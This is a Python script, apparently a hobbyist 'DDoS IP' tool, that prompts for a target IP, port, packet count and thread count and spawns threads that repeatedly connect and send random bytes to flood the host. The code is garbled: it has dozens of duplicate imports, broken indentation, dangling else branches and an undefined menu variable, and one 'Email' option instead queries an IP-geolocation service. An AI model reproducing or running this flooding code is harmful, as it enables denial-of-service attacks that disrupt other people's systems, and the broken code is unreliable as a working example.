import socket
import random
import os
import time
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass
from ast import Num
import code
import requests
import socket
from multiprocessing.connection import wait
from operator import contains
from platform import system
import random
from socket import timeout
import os
import sys
import time
from time import sleep
import math
import threading

time.sleep(1)
os.system("clear")

os.system("figlet DDoS IP")
time.sleep(3)

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.045)

type("""Tools DDos Methods IP tool""")
time.sleep(3)
os.system("clear")

print("\n\n\n▀█▀ ▒█▀▀█ 　 ▒█▀▀▄ ▒█▀▀▄ ▒█▀▀▀█ ▒█▀▀▀█\n▒█░ ▒█▄▄█ 　 ▒█░▒█ ▒█░▒█ ▒█░░▒█ ░▀▀▀▄▄\n▄█▄ ▒█░░░ 　 ▒█▄▄▀ ▒█▄▄▀ ▒█▄▄▄█ ▒█▄▄▄█")
            
            ip = str(input('[*][Ip Adress]: => '))
            port = int(input('[*][Port]: => '))
            pack = int(input('[*][Packs]: => '))
            thread = int(input('[*][Threads]: => '))
            
            def start():
                hh = random._urandom(10)
                xx = int(0)
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(hh)
                        for i in range(pack):
                            s.send(hh)
                        xx += 1
                        print('Attacking'+ip+' | Sent:'+str(xx))
                    except:
                        s.close()
                        print('Done')
            
            for x in range(thread):
                thred = threading.Thread(target=start)
                thred.start()
                
            
            
        else:
                
            if num1 == '3':
                
                print("\n\n\n▒█▀▀▀ █▀▄▀█ █▀▀█ ░▀░ █░░\n▒█▀▀▀ █░▀░█ █▄▄█ ▀█▀ █░░\n▒█▄▄▄ ▀░░░▀ ▀░░▀ ▀▀▀ ▀▀▀")
                
                response = requests.get("http://ip-api.com/json/24.48.0.1")
                print(response)



            else:
                
            
                if num1 == '4':
                    
                    print("Closing in 2 Seconds")
                    time.sleep(2)
                    quit()
                
                else:
                    
                    print("Your Number is invalid")
                
#print('Atacando porta 💥')
